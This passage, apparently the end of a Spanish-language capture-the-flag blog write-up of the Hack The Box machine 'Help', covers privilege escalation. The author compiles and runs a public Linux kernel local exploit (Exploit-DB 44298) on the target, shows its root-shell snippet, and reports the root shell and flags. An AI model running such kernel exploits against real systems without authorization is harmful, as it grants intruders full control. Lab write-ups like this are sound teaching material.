* [Linux Kernel \< 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation](https://www.exploit-db.com/exploits/44298).

Una explotación al [kernel](https://www.ediciones-eni.com/open/mediabook.aspx?idR=8a12dad1db3537bb61f40e77e94e0142) que despues de jugar con huecos en la memoria, shellcodes y cositas nos debería devolver una `/bin/bash` siempre y cuando seamos **root** (despues de toodo el proceso que hace):

```c
...
    if (getuid() == 0) {
        printf("spawning root shell\n");
        system("/bin/bash");
        exit(0);
...
```

Pues intentemos usarlo, veamos si la máquina tiene `gcc` para compilarlo, o si no lo compilamos en nuestra máquina y despues lo subimos:

```bash
help@help:/tmp$ which gcc
/usr/bin/gcc
```

Listos, existe, así que copiamos el código del exploit y movámoslo a la máquina víctima:

```bash
help@help:/tmp/keke$ file kerLokhe.c 
kerLokhe.c: C source, ASCII text, with CRLF line terminators
```

Ahora compilémoslo para generar el ejecutable:

```bash
help@help:/tmp/keke$ gcc kerLokhe.c -o kerLokhe
```

```bash
help@help:/tmp/keke$ file kerLokhe
kerLokhe: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e3143a5446c02fb5b32c79eaf037488a003040af, not stripped
```

Listo, pues ejecutémoslo:

```bash
help@help:/tmp/keke$ ./kerLokhe
```

Instantáneamente veeeeeeeeemooooooooooooooooooooos:

![170bash_helpSH_kernelExploit_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170bash_helpSH_kernelExploit_done.png)

Y conseguimos nuestra dichosa `/bin/bash` como el usuario `root` (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170google_gif_dancebeer.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Veamos las flags:

![170flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170flags.png)

...

Linda máquina, completica de **vulnerabilidades conocidas (`CVEs`)**, lo cual está brutal, ya que apunta a ser lo más real (y lo es).

Muchas gracias por leer y como siempre, A S3GU1R R0MP1ENDO 7ODO!!!